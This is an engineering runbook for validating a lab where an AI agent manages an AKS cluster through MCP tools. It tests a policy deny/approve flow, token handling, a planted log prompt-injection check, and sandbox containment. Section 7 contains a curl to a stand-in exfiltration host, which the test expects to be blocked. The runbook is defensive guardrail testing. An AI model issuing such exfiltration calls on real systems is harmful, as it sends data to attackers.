# End-to-end validation runbook

## Current Skillable rehearsal

Start a fresh lab with the corrected generated Bicep saved in template 6891,
`deployLabSetup=true`, and `preinstallAgent=false`. Have Skillable persist the
model allocation in template 6838 before launching. Follow the
[coordinator checklist](docs/COORDINATOR-CHECKLIST.md), then run all nine tasks
in [LAB-GUIDE.md](LAB-GUIDE.md) without manual platform repairs.

Fresh instance 66301586 completed the core incident and boundary workflow on
October 16. Its downloaded archive contains actual MCP results for diagnosis,
one approved restart, recovery, unchanged replica counts and RBAC, plus a
matching target-specific egress audit. See [RESULTS.md](RESULTS.md) for the
log-prompt correction, expected denials and extra wait-helper errors. This
establishes one successful core workflow, not event readiness.

For the log exercise, require `verify_application` to finish before immediately
calling `get_logs`. Verify the returned log actually contains the planted
warning; an absent warning means the injection test was not exercised. Use
application health rather than `/debug/config` success to judge recovery.

Capture new-learner timing, reconnect/resume, reset and termination results,
then rehearse throughput at the planned concurrency. Keep the MCP pod running
past the original projected token's expiry and verify both configuration
reads again without restarting the pod. Record the same pod identity and
expiry/rotation metadata only, never the token. The local rotation regression
and this fresh run do not replace that live duration check.

## Historical mock-inference rehearsal

This records the earlier tested Azure VM-to-AKS proof of concept using the
checkout/payments fixture. It is historical engineering evidence, not a
runbook for the current generic `service-api`/`dependency-api` fixture or the
proposed attendee-run installation. Do not run it unchanged against the
current manifests. Use the Skillable path above for the current fixture.

## 1. Establish the environment

```bash
export AZURE_SUBSCRIPTION_ID=00000000-0000-0000-0000-000000000000
export VM_RESOURCE_GROUP=example-lab-rg
export VM_NAME=ignite-agent-example-vm
export VM_LOCATION=southcentralus
export VM_PUBLIC_IP=192.0.2.10
export AKS_CONTEXT=aks-dynamo-a100
export LAB_NAMESPACE=nooa-admission-test

az account set --subscription "$AZURE_SUBSCRIPTION_ID"
kubectl config use-context "$AKS_CONTEXT"
```

Validate identity and scope before creating anything:

```bash
az vm show --resource-group "$VM_RESOURCE_GROUP" --name "$VM_NAME" \
  --show-details \
  --query '{name:name,state:powerState,publicIps:publicIps,privateIps:privateIps,vmSize:hardwareProfile.vmSize}'
kubectl --context "$AKS_CONTEXT" auth can-i create namespaces
kubectl --context "$AKS_CONTEXT" get nodes
```

Stop if the VM public IP differs from `192.0.2.10`; the test LoadBalancers
are restricted to that exact `/32`.

## 2. Deploy the private AKS lab

```bash
./scripts/deploy.sh
./scripts/test-incluster-mcp.sh
```

Expected state:

- four Ready deployments, all requesting zero GPUs;
- desired checkout URL is `http://payments-api:8081`;
- running checkout URL is still `http://payments-api-invalid:8081`;
- the in-cluster MCP smoke Job passes and is deleted.

Review generated state without printing the token:

```bash
source .lab-state
printf 'namespace=%s\nrun_id=%s\nstate_dir=%s\n' \
  "$NAMESPACE" "$RUN_ID" "$STATE_DIR"
test -s "$STATE_DIR/mcp-token"
test -s "$STATE_DIR/ca.crt"
```

## 3. Allocate temporary routed endpoints

`k8s/public-endpoints.yaml` initially selects no pods. It is source-restricted
to `192.0.2.10/32`.

```bash
kubectl --context "$AKS_CONTEXT" apply -f k8s/public-endpoints.yaml
kubectl --context "$AKS_CONTEXT" --namespace "$LAB_NAMESPACE" \
  get service aks-ops-mcp-public mock-inference-public --watch
```

After both external IPs appear:

```bash
export MCP_PUBLIC_IP="$(kubectl --context "$AKS_CONTEXT" --namespace "$LAB_NAMESPACE" get service aks-ops-mcp-public -o jsonpath='{.status.loadBalancer.ingress[0].ip}')"
export INFERENCE_PUBLIC_IP="$(kubectl --context "$AKS_CONTEXT" --namespace "$LAB_NAMESPACE" get service mock-inference-public -o jsonpath='{.status.loadBalancer.ingress[0].ip}')"
test -n "$MCP_PUBLIC_IP"
test -n "$INFERENCE_PUBLIC_IP"

./scripts/rotate-public-tls.sh "$MCP_PUBLIC_IP" "$INFERENCE_PUBLIC_IP"
```

The rotation script creates a two-day certificate with both IP SANs, updates
the TLS Secret, rolls the HTTPS pods, and replaces the disabled selectors.

```bash
kubectl --context "$AKS_CONTEXT" --namespace "$LAB_NAMESPACE" \
  get service,endpoints aks-ops-mcp-public mock-inference-public -o wide
```

Both Services must have ready endpoints before proceeding. For Ignite, prefer
private routing rather than public per-attendee LoadBalancers.

## 4. Install and onboard NemoClaw

Run the script as a root Azure Managed Run Command. It switches to
`labuser` for user installation. The private CA is scoped to the command;
it is not installed into the VM's system trust store.

```bash
source .lab-state
CA_B64="$(base64 < "$STATE_DIR/ca.crt" | tr -d '\n')"
MOCK_MODEL_KEY="$(openssl rand -hex 24)"
INSTALL_SCRIPT="$(<vm/install-nemoclaw.sh)"

az vm run-command create \
  --resource-group "$VM_RESOURCE_GROUP" \
  --vm-name "$VM_NAME" \
  --run-command-name nemoclaw-install-e2e \
  --location "$VM_LOCATION" \
  --async-execution false \
  --timeout-in-seconds 1800 \
  --script "$INSTALL_SCRIPT" \
  --parameters LAB_CA_B64="$CA_B64" \
    INFERENCE_ENDPOINT_URL="https://${INFERENCE_PUBLIC_IP}:8000/v1" \
  --protected-parameters COMPATIBLE_API_KEY="$MOCK_MODEL_KEY"

unset MOCK_MODEL_KEY CA_B64 INSTALL_SCRIPT
```

Check the guest exit code, not only Azure provisioning state:

```bash
az vm run-command show \
  --resource-group "$VM_RESOURCE_GROUP" \
  --vm-name "$VM_NAME" \
  --run-command-name nemoclaw-install-e2e \
  --expand instanceView \
  --query '{state:instanceView.executionState,exitCode:instanceView.exitCode,output:instanceView.output,error:instanceView.error}'
```

Required proof includes Docker health, sandbox creation, CUDA proof when a GPU
exists, OpenClaw running, and successful model discovery/completion through
`inference.local`.

## 5. Register managed MCP

```bash
source .lab-state
MCP_TOKEN="$(<"$STATE_DIR/mcp-token")"
REGISTER_SCRIPT="$(<vm/register-mcp.sh)"

az vm run-command create \
  --resource-group "$VM_RESOURCE_GROUP" \
  --vm-name "$VM_NAME" \
  --run-command-name nemoclaw-register-mcp \
  --location "$VM_LOCATION" \
  --async-execution false \
  --timeout-in-seconds 600 \
  --script "$REGISTER_SCRIPT" \
  --parameters MCP_ENDPOINT_URL="https://${MCP_PUBLIC_IP}:8443/mcp" \
  --protected-parameters AKS_OPS_MCP_TOKEN="$MCP_TOKEN"

unset MCP_TOKEN REGISTER_SCRIPT
```

Continue only when `mcp status --json` reports provider present, attached, and
credential-ready; credential probe 200; no-credential control 401; policy
configured; and OpenClaw adapter registered.

The initial deny list contains both mutation tools:

```text
restart_deployment
scale_deployment
```

## 6. Exercise deny, approve, act

The mock recognizes `LAB_ACTION` markers. A real-model lab should use natural
language prompts.

```text
nemoclaw ignite-agent exec --timeout 150 -- \
  openclaw agent --agent main \
  -m "LAB_ACTION=VERIFY. Check checkout before remediation."
```

Expected: HTTP 503 and `healthy: false`.

Record Deployment generation and restart annotation, then ask the agent to
restart:

```text
nemoclaw ignite-agent exec --timeout 150 -- \
  openclaw agent --agent main \
  -m "LAB_ACTION=RESTART. Restart checkout-api."
```

Expected: `policy_denied`, with no Kubernetes mutation.

Simulate operator approval for only restart:

```text
nemoclaw ignite-agent mcp update aks-ops --deny-tool scale_deployment
```

Start a fresh agent session after this live policy transition in the
Ignite-pinned OpenClaw build, then issue the restart request again. Expected:
MCP HTTP 200 and a successful rollout.

```bash
kubectl --context "$AKS_CONTEXT" --namespace "$LAB_NAMESPACE" \
  rollout status deployment/checkout-api --timeout=180s
```

Verify recovery through the agent or `vm/mcp-call.mjs`. The diagnostic client
reads the generated URL and credential placeholder; it never reads the token.
Expected result is HTTP 200 and `healthy: true`.

Call `scale_deployment` with two replicas. Expected result is HTTP 403
`policy_denied`; desired and ready replicas must remain one.

## 7. Test containment

Inside the sandbox:

```text
curl -sS --max-time 10 https://exfil.ignite-lab.example/collect
```

Expected: curl exit 56, CONNECT HTTP 403, and an OCSF log saying the endpoint
is not allowed by any policy.

Call `rbac_self_test` through managed MCP. Expected results:

- assigned namespace: 200;
- `default` namespace: 403;
- same-namespace Secrets: 403;
- `isolation_enforced: true`.

## 8. Clean up

On the VM:

```text
nemoclaw ignite-agent mcp remove aks-ops --force
nemoclaw ignite-agent destroy --yes --cleanup-gateway
```

Delete public AKS exposure:

```bash
kubectl --context "$AKS_CONTEXT" --namespace "$LAB_NAMESPACE" \
  delete service aks-ops-mcp-public mock-inference-public --wait=true
```

Delete persistent Managed Run Command resources because they carried protected
test parameters:

```bash
az vm run-command delete --resource-group "$VM_RESOURCE_GROUP" \
  --vm-name "$VM_NAME" --run-command-name nemoclaw-register-mcp --yes
az vm run-command delete --resource-group "$VM_RESOURCE_GROUP" \
  --vm-name "$VM_NAME" --run-command-name nemoclaw-install-e2e --yes
```

On a dedicated fresh test VM only, remove test-created gateway state after
confirming no other sandbox uses it. Do not delete shared NemoClaw state.

Delete or reset AKS when inspection is complete:

```bash
./scripts/cleanup.sh
```

The namespace cleanup deliberately leaves the protected local temporary
directory so the operator controls when final evidence and credentials are
deleted.
